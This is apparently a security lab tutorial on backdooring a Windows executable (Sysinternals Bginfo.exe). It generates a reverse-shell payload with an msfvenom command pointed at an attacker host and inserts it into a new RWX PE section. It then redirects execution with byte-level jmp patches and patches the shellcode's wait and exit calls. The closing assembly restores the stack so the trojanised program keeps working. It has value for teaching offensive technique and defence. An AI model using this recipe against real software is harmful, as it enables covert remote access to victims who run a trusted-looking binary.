# Backdooring PE Files with Shellcode
The purpose of this lab is to learn the Portable Executable (PE) backdooring technique by adding a new readable/writable/executable code section with our malicious shellcode to any portable executable file.

<ul>
  <li>High level process of this technique:</li>
  <ul>
    <li>Add a new RWX PE section, big enough to hold our shellcode, to any .exe file</li>
    <li>Generate shellcode</li>
    <li>Add shellcode to the newly created PE section</li>
    <li>Redirect execution flow of the .exe file being backdoored to the shellcode</li>
    <li>Redirect execution flow back to the legitimate .exe instructions</li>
  </ul>
</ul>

# Generate Shellcode
First of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:

```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)

Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.

# New PE Code Section
I randomly chose Bginfo.exe from sysinternals as a binary to be backdoored. Let's add a new PE section called ```.code1``` that will contain our shellcode - note the size is 200h bytes, so plenty for our shellcode which was only 324 bytes:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/cbd3afd7-743d-4fb5-8229-f9e1e603967a)

Note the Raw Address of the new section which is CD200 - this is where we will place the shellcode inside the file in later steps.

Let's make the new PE section writable/executable and mark it as ```contains code``` using CFF Explorer:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/716391fe-41a2-4726-8d45-cda36285d1f8)

# Inserting Shellcode
Let's copy the shellcode over to the new code section, starting at 0xCD200 into the file:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/a758cb03-9b26-49d3-8ec2-d90381932539)

# Testing the Shellcode
Let's see if we can force the Bginfo.exe binary to execute our shellcode using debugger first. We need to find the base address of Bginfo.exe, which we see is 0x00400000:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/507dae91-e32c-4b2e-a1af-40da1979b3d4)

Since the new section .code1 that holds our shellcode has an RVA 000D8000, we can find the shellcode in a running process at 00400000+00d8000 = ‭4D8000‬. Below shows that the bytes at cd200 (file offset) match those at 4d8000 while the bginfo.exe is running:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/d2a3b0a1-3a05-46dc-bddd-27901d1f548b)

When debugging the binary, if we set the EIP to point to 4D8000‬ and let the debugger run, if we have a listener on the attacking system, we get the reverse shell which confirms that we can successfully execute the shellcode if we manage to redirect the code execution flow of bginfo.exe:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/d44f53e6-c25d-4a24-a435-a995e5b17d8d)

## ℹ️ information
In the above screenshot, ```pushad``` and ```pushfd``` are the first instructions at 4d8000 - it's not shown in this lab how those two instructions were inserted there, but there is no magic  - just add ```60 9c``` bytes  before the shellcode at 0xCD200 in the bginfo and you're set.

# Redirecting Code Execution Flow
In previous paragraph we confirmed the shellcode can be executed, but we did this manually, with help of a debugger. Now let's patch the binary, so that the process is automated and does not require our intervention.

The process of patching the binary to redirect the code execution flow is as follows:

<ol>
  <li>Find the first instruction that is 5 bytes in size inside the bginfo.exe binary
   <ol>
     <li>We will overwrite this instruction with a <em><strong>jump</strong></em> to the shellcode as explained in step 2</li>
     <li>Prior to overwriting this instruction, write it down somewhere - we will need to append it to our shellcode later in order to restore the code execution flow</li>
     <li>Write down the address of the next instruction to be executed next - after the shellcode has been executed, stack and registers restored, we will jump back to this address to let the bginfo.exe continue as normal</li>
   </ol>
  </li>
  <li>Overwrite the instruction in step 1 with a jump to the shellcode at 4D8000‬</li>
  <li>Save registers' and flags' state by prepending the shellcode with <em><strong>pushad</strong></em> and <em><strong>pushfd</strong></em> instructions - we do this so we can restore their state before redirecting the execution back to bginfo.exe and avoid any crashes</li>
  <li>Remember the ESP register value - we will need this when calculating by how much the stack size grew during the shellcode execution. This is required in order to restore the stack frame before redirecting the code execution back to bginfo.exe</li>
  <li>Modify the shellcode
    <ol>
      <li>Make sure that <em><strong>WaitForSingleObject</strong></em> does not wait indefinitely and does not freeze bginfo.exe once the shellcode is executed</li>
      <li>Remove the last instruction of the shellcode <em><strong>call ebp</strong></em> to prevent the shellcode from shutting down of bginfo.exe</li>
    </ol>
  </li>
  <li>Note the ESP value and the end of shellcode execution - this is related to point 4 and 7</li>
  <li>Restore the stack pointer ESP to what it was after the shellcode executed <em><strong>pushad</strong></em> and <em><strong>pushfd</strong></em> as explained in step 3, with . This is where ESPs from point 4 and 7 comes in to play <em><strong>add esp, <ESP_POST_SHELLCODE - ESP_PRE_SHELLCODE></strong></em></li>
  <li>Restore registers with <em><strong>pushfd</strong></em> and <em><strong>pushad</strong></em></li>
  <li>Append the shellcode with the instruction we had overwritten in step 1</li>
  <li>Restore code execution back to bginfo by jumping back to the next instruction after the owerwritten one as explained in 1.3</li>
</ol>

# Overwriting 5 byte Instruction

Let's now hijack the bginfo.exe code execution flow by overwriting any instruction that is 5 bytes in size - again - this is how many bytes we need for a ```jmp address``` instruction.

One of the first 5-byte instructions we can see is ```mov edi, bb40e64e``` at 00467b29:

## ⚠️ Important
We are about to overwrite the instruction ```mov edi, 0xbb40e64e``` at 00467b29, hence we need to remember it for later as explained in 1.2.

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/7214612e-9786-4419-b82c-a822d84465d3)

Let's overwrite the instruction at 00467b29 with an instruction ```jmp 0x004d8000````which will make the bginfo jump to our shellcode located at 0x004d8000 when executed:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/894398fd-0cbd-4ae9-a1c4-06214b66d6fd)

## ⚠️ Important
Remember the address of the next instruction after 0046b29, which is 0467b2e - this is the address we will jump back after the shellcode has executed in order to resume bginfo.

There are multiple ways to overwrite the instructions at 00467b29 - either assemble the bytes using a debugger or patch the binary via a hex editor which is what I did. I found the bytes ```bf 4e e6 40 bb``` (bytes found at 00467b29 when bginfo is in memory) in the bginfo.exe (screenshot below) and replaced them with bytes ```e9 d2 04 07 00``` which translates to jmp ```bgfinfo.d48000``` (jump to our shellcode, above screenshot).

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/be4cb830-3d6a-44ad-ad9e-31734d5dcf52)

Below shows how the code redirection works and we jump to 4d8000 (shellcode) location once we hit the instruction at 00467b29:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/c23f99af-ba16-4ae6-8798-66fa4e7a8657)

If we try running the patched binary now, we can see it results in a reverse shell, however the bginfo.exe itself is not visible - we will need to fix that:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/b46499da-d3ac-41f0-a283-cb7433df9313)

# Patching Shellcode

## Patching WaitForSingleObject

The reason the bginfo.exe is not showing any UI is because the thread is blocked by the shellcode call to ```WaitForSingleObject``` function (see definition below). It's called with an argument ```INFINITE``` (-1 or 0xFFFFFFFF‬), meaning the thread will be blocked forever.

```WaitForSingleObject``` definition:
```
DWORD WaitForSingleObject(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);
```

The below screenshot shows that EAX points to ```WaitForSingleObject``` which is going to be jumped to with ```jmp eax``` at 004d8081. Note the stack - it contains the thread handle (28c) to block and the wait time FFFFFFFF == INFINITE which is the second argument for ```WaitForSingleObject```:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/9d1461ce-d590-4127-bbee-47b520af4283)

Instruction ```dec esi``` at 004d811b changes ESI value to -1 (currently ESI = 0), which is the value pushed to the stack as an argument ```dwMilliSeconds``` for ```WaitForSignaledObject```:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/4a356210-494b-41de-b357-58ed7ccf1a1a)

Let's NOP that instruction, so that ESI stays unchanged at 0, which means that ```WaitForSingleObject``` will wait 0 seconds before unblocking the UI:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/c2ca7122-80c2-4bdf-a3e1-f45acc716f79)

## Restoring Stack Frame & Jumping Back

Next, we need to patch the ```call ebp``` instruction at 004d8144 if we don't want the shellcode to close the bginfo.exe process:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/2365da84-5fd0-4dd8-8520-bc2f3ffceaf4)

We will do this by replacing this instruction with an instruction that will restore our stack frame pointer ESP to what it was before we started executing our shellcode, but after we executed ```pushad``` and ```pushfd``` instructions as mentioned in point 7.

From earlier, the ```ESP``` after ```pushad``` and ```pushfd``` was ```0019ff30```:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/a8cfa19e-579b-4890-bb55-1f4473da2659)

```ESP``` after executing the shellcode was ```0019fd2c```:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/e52ffe96-fa39-4193-9f78-0db2e8a56f13)

Which means that the stack grew by 204h bytes:

![Capture d'écran 2024-07-04 231553](https://github.com/0x074b/Code-Process_Injection/assets/83349783/3924a807-ea4e-4e0e-b3d7-e4ecf249051e)

<ul>
  <li>Knowing all of the above, we need to:</li>
  <ul>
    <li>restore the stack by increasing the ESP by 0x204 bytes</li>
    <li>restore registers and flags with <em><strong>popfd</strong></em> and <em><strong>popad</strong></em></li>
    <li>re-introduce the instruction we previously had overwritten with a jump to our shellcode</li>
    <li>jump back to the next instruction after the overwritten instruction that made the jump to the shellcode</li>
  </ul>
</ul>

All the above steps in assembly would be:

```
add esp, 0x204
popfd
popad
mov edi, 0xbb40e64e
jmp 0x00467B2E
```

The below screenshot shows the very end of the shellcode with the above instructions encircled:

![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/ae151b44-8cfb-4e38-9ad0-2bb975cabe19)

# Backdoor Demo

> https://youtu.be/bX97Kk85zYc





